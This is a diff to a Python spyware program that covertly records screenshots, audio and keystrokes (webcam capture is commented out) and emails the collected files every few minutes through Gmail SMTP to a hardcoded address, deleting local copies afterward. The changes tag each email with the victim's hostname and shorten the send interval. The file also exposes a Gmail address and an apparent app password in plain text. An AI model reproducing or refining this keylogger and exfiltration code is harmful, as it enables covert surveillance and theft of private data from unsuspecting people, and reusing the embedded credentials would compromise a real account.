@@ -17,6 +17,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 from threading import Thread
+import socket
 
 # Do not forget to use app passsword >> https://myaccount.google.com/u/2/apppasswords
 # Written by VuQn
@@ -25,7 +26,7 @@ from threading import Thread
 sender_email = "tiennguyenmanh.0306@gmail.com"  #Enter email here
 sender_password = "qpwb ccsa dpuq gkht"         #Enter app password of email here
 receiver_email = sender_email                   #Enter receiver email here
-mail_interval = 3000                             #Adjust the time between each email send
+mail_interval = 300                             #Adjust the time between each email send
 save_interval = 10                              #Adjust the time between each file save
 
 # Name of folder
@@ -34,6 +35,7 @@ screenshots_folder = folder_path + "screenshots"
 webcam_folder = folder_path + "webcam_images"
 audio_folder = folder_path + "audio_files"
 keylog_folder = folder_path + "keylogs"
+computer_name = socket.gethostname()
 
 if not os.path.exists(screenshots_folder):
     os.makedirs(screenshots_folder)
@@ -78,7 +80,7 @@ def send_files_email(sender_email, sender_password, receiver_email, files_folder
 
     if files:
         current_date = datetime.now().strftime("%d %m %Y")
-        subject = f"{files_folder.replace(folder_path, '')} taken on {current_date}"
+        subject = f"{computer_name}: {files_folder.replace(folder_path, '')} taken on {current_date}"
         msg = MIMEMultipart()
         msg['From'] = sender_email
         msg['To'] = receiver_email
@@ -238,12 +240,12 @@ def keylog_join():
         keylogger.join()
 
 screen_thread = Thread(target=capture_and_save_screen, args=(screenshots_folder,))
-webcam_thread = Thread(target=capture_and_save_webcam, args=(webcam_folder,))
+# webcam_thread = Thread(target=capture_and_save_webcam, args=(webcam_folder,))
 audio_thread = Thread(target=record_and_save_audio, args=(audio_folder,))
 keylogger_thread = Thread(target=keylog_join)
 
 screen_thread.start()
-webcam_thread.start()
+# webcam_thread.start()
 audio_thread.start()
 keylogger_thread.start()
 
@@ -251,11 +253,11 @@ while True:
     time.sleep(mail_interval)
     
     send_files_email(sender_email, sender_password, receiver_email, screenshots_folder)
-    send_files_email(sender_email, sender_password, receiver_email, webcam_folder)
+    # send_files_email(sender_email, sender_password, receiver_email, webcam_folder)
     send_files_email(sender_email, sender_password, receiver_email, audio_folder)
     send_files_email(sender_email, sender_password, receiver_email, keylog_folder)
     
     delete_all_files(screenshots_folder)
-    delete_all_files(webcam_folder)
+    # delete_all_files(webcam_folder)
     delete_all_files(audio_folder)
     delete_all_files(keylog_folder)
